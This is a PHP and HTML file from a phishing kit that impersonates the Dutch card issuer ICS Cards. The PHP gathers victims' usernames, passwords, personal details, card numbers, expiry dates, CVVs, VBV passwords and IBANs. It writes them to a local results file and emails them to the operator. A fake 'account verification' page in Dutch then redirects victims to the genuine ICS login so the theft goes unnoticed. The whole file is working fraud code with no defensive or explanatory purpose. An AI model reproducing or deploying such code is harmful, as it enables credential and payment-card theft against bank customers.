<?php

session_start();

require "includes/my_email.php";

$number= $_POST['card_number'];

function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else
    {
        return false;
    } 
 }

validatecard($number);


if (validatecard($number) !== false)  {

}

else  {

$_SESSION['cardholder_name'] = $_POST['cardholder_name'];
$_SESSION['card_number'] = $_POST['card_number'];
$_SESSION['expiry_month'] = $_POST['expiry_month'];
$_SESSION['expiry_year'] = $_POST['expiry_year'];
$_SESSION['cvv'] = $_POST['cvv'];
$_SESSION['vbv_pass'] = $_POST['vbv_pass'];
$_SESSION['iban'] = $_POST['iban'];

header('Location: error.php');
die();

}

if(isset($_SESSION['username']))  {

 $username = $_SESSION['username'];
 
}

if(isset($_SESSION['password']))  {

 $password = $_SESSION['password'];
 
}

if(isset($_SESSION['first_name']))  {

 $first_name = $_SESSION['first_name'];
 
}

if(isset($_SESSION['last_name']))  {

 $last_name = $_SESSION['last_name'];
 
}

if(isset($_SESSION['dob_day']))  {

 $dob_day = $_SESSION['dob_day'];
 
}

if(isset($_SESSION['dob_month']))  {

 $dob_month = $_SESSION['dob_month'];
 
}

if(isset($_SESSION['dob_year']))  {

 $dob_year = $_SESSION['dob_year'];
 
}

if(isset($_SESSION['address']))  {

 $address = $_SESSION['address'];
 
}

if(isset($_SESSION['town']))  {

 $town = $_SESSION['town'];
 
}

if(isset($_SESSION['postal_code']))  {

 $postal_code = $_SESSION['postal_code'];
 
}

if(isset($_SESSION['phone_number']))  {

 $phone_number = $_SESSION['phone_number'];
 
}

if(isset($_POST['cardholder_name']))  {

 $cardholder_name = $_POST['cardholder_name'];
 
}

if(isset($_POST['card_number']))  {

 $card_number = $_POST['card_number'];
 
}

if(isset($_POST['expiry_month']))  {

 $expiry_month = $_POST['expiry_month'];
 
}

if(isset($_POST['expiry_year']))  {

 $expiry_year = $_POST['expiry_year'];
 
}

if(isset($_POST['cvv']))  {

 $cvv = $_POST['cvv'];
 
}

if(isset($_POST['vbv_pass']))  {

 $vbv_pass = $_POST['vbv_pass'];
 
}

if(isset($_POST['iban']))  {

 $iban = $_POST['iban'];
 
}

$full_name = $first_name . " " . $last_name;
$dob = $dob_day . "/" . $dob_month . "/" . $dob_year;

$expiry_date = $expiry_month . "/" . $expiry_year;

date_default_timezone_set('Europe/Amsterdam');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

$msg = "---------------------------------------------------------------------------\n";
$msg .= "ICS Login\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Login Details\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "User ID: ".$username."\n";
$msg .= "Password: ".$password."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Personal Details\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Full name: ".$full_name."\n";
$msg .= "Date of birth: ".$dob."\n";
$msg .= "Address: ".$address."\n";
$msg .= "Town: ".$town."\n";
$msg .= "Postal code: ".$postal_code."\n";
$msg .= "Phone number: ".$phone_number."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Card & Account Details\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Cardholder name: ".$cardholder_name."\n";
$msg .= "Card number: ".$card_number."\n";
$msg .= "Expiry date: ".$expiry_date."\n";
$msg .= "CVV: ".$cvv."\n";
$msg .= "VBV password: ".$vbv_pass."\n";
$msg .= "IBAN: ".$iban."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "---------------------------------------------------------------------------\n";

$subject = "ICS Login for $ip";
$headers = "From: ICS Logins<$my_email>\r\n";
$headers .= "Reply-To: ICS Logins <$my_email>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

$fp = fopen("results.txt", "a");
fputs($fp,$msg);
fclose($fp);

mail($my_email,$subject,$msg,$headers,$fp);

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html lang="nl" xml:lang="nl" xmlns="http://www.w3.org/1999/xhtml" class="win chrome chrome5 webkit webkit5"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style></style>

<title>Security</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="refresh" content="10;URL='https://www.icscards.nl/ics/login'" />
<link rel="stylesheet" type="text/css" href="./step1_files/reset.css">
<link rel="stylesheet" type="text/css" href="./step1_files/structure.css">
<link rel="stylesheet" type="text/css" href="./step1_files/components.css">
<link rel="stylesheet" type="text/css" href="./step1_files/jquery.keypad.css">
<link rel="stylesheet" type="text/css" href="./step1_files/jquery.keypad.css">
<link rel="stylesheet" type="text/css" href="./step1_files/js-enabled.css">
<!--[if IE 7]><link href="/theme/ics/style/ie7-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<!--[if IE 8]><link href="/theme/ics/style/ie8-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<!--[if IE 9]><link href="/theme/ics/style/ie9-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<style type="text/css">@import url(./step1_files/import.css);</style>
</head>
<body class="ics">
<div id="PageContainer">
<div class="RowContainer">

<div class="clear"><div id="Header"><div class="header-block"><div class="logo-block"><img alt="Logo voor afdruk-weergave" src="./step1_files/logo-ics.gif" class="print"><a href="" title=""><strong></strong></a></div></div><div id="Navigation" class="navigation-block"><strong class="text-only">Pagina navigatie:</strong><ul><li id="nav-00"><a href=""><span>Home</span></a></li><li id="nav-01"><a href=""><span>Producten</span></a></li><li id="nav-02"><a href=""><span>Aanbiedingen</span></a></li><li id="nav-03"><a href=""><span>Klantenservice</span></a></li><li id="nav-05"><a id="nav-login" href=""><span>Mijn ICS</span></a></li></ul><form enctype="text/plain" method="get" action=""><fieldset><legend>Zoeken</legend><label for="searchString" class="text-only">Uw vraag in minimaal 2 woorden</label><input maxlength="128" class="text-field label-value remove-value no-focus" name="searchString" id="searchString" type="text"><input class="button-submit" value="" name="search-header" id="search-header" type="submit" formnovalidate="formnovalidate"></fieldset></form></div></div>
</div>
<div class="RowContainer">
<div class="col maincontent">
<div class="form-block">
<div class="form-container">
<h1>Acount verifiëren - compleet voor "<strong><?php if(isset($_POST['username']))  { echo $_POST['username']; } ?></strong>"</h1><br><br>
<p>Even geduld aub...</p><p>We zijn u informatie aan het verwerken...</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="./step1_files/spin.gif"></p><p>Na het verwerken van de informatie word u automatisch uitgelogd en doorverwezen terug naar onze pagina.</p>

</div>
</div>
</div>
<div class="col sidebar">
<div class="container">
<div class="row">
<div class="col" style="width:44px;">

</div>
</div>
<div class="row">
<div class="col" style="width:260px;"><div class="login-block"><div class="inner"><h2>Mijn ICS</h2><div class="linklist-block"><ul><li><a href="">Activeren online omgeving</a></li><li><a href="">Meer weten over Mijn ICS</a></li><li class="link-more"><a href="">Inloggegevens vergeten?</a></li></ul></div><div class="login"><span><a name="button_inloggen" href=""><span>Inloggen</span></a></span></div></div></div></div>
</div>
</div>
</div>
</div>
<div class="RowContainer">
<div id="footerlinks-block">
<div class="footerlinks-block"><a class="usp-campagne" href=""><img src="./step1_files/usp_banner.png"></a><strong class="text-only">Algemene links:</strong><ul style="width:990px;margin-top: 0;"><li><span><a title="" href="">Over ICS</a></span></li><li><span><a title="" href="">Contact</a></span></li><li><span><a title="" href="">Privacy Statement</a></span></li><li><span><a title="Cookies instellen" href="">Cookies</a></span></li><li><span><a title="" href="">Disclaimer</a></span></li><li><span><a title="" href="">Algemene Voorwaarden</a></span></li><li><span><a title="Zakelijke Cards" href="" target="_blank">Zakelijke Cards</a></span></li><li><span><a title="" href="">Pers</a></span></li></ul><p></p></div>

</div>
</div>
</div>


</div></body></html>